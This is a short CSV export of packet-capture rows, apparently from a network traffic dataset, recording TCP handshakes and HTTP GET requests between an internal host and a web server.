"R"," R", "403132","12:10:10.499332","207.217.78.131","172.16.112.100","TCP","60","80 → 1965 [ACK] Seq=805 Ack=343 Win=32735 Len=0"
"R"," R", "403133","12:10:10.594502","172.16.116.194","208.209.46.37","TCP","60","7271 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403134","12:10:10.600701","208.209.46.37","172.16.116.194","TCP","60","80 → 7271 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403135","12:10:10.600886","172.16.116.194","208.209.46.37","TCP","60","7271 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403136","12:10:10.601304","172.16.116.194","208.209.46.37","HTTP","196","GET / HTTP/1.0 "
"R"," R", "403137","12:10:10.618804","208.209.46.37","172.16.116.194","TCP","475","[TCP segment of a reassembled PDU]"
"R"," R", "403138","12:10:10.618876","208.209.46.37","172.16.116.194","HTTP","60","HTTP/1.1 200 OK  (text/html)"
"R"," R", "403139","12:10:10.619015","172.16.116.194","208.209.46.37","TCP","60","7271 → 80 [ACK] Seq=143 Ack=423 Win=31698 Len=0"
"R"," R", "403140","12:10:10.619549","172.16.116.194","208.209.46.37","TCP","60","7271 → 80 [FIN, ACK] Seq=143 Ack=423 Win=32120 Len=0"
"R"," R", "403141","12:10:10.623094","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "403142","12:10:10.623592","208.209.46.37","172.16.116.194","TCP","60","80 → 7271 [ACK] Seq=423 Ack=144 Win=32735 Len=0"
"R"," R", "403143","12:10:10.627197","208.209.46.37","172.16.116.194","TCP","60","80 → 7272 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"R"," R", "403144","12:10:10.627353","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "403145","12:10:10.627804","172.16.116.194","208.209.46.37","HTTP","204","GET /home.asp HTTP/1.0 "
"R"," R", "403146","12:10:10.644382","208.209.46.37","172.16.116.194","TCP","60","80 → 7272 [ACK] Seq=1 Ack=151 Win=32736 Len=0"
"R"," R", "403147","12:10:10.654334","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403148","12:10:10.655563","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403149","12:10:10.657099","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [ACK] Seq=151 Ack=2921 Win=32120 Len=0"
"R"," R", "403150","12:10:10.663204","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403151","12:10:10.664435","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403152","12:10:10.665681","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
"R"," R", "403153","12:10:10.667097","172.16.116.194","208.209.46.37","TCP","60","7272 → 80 [ACK] Seq=151 Ack=7301 Win=32120 Len=0"
"R"," R", "403154","12:10:10.672994","208.209.46.37","172.16.116.194","TCP","1514","[TCP segment of a reassembled PDU]"
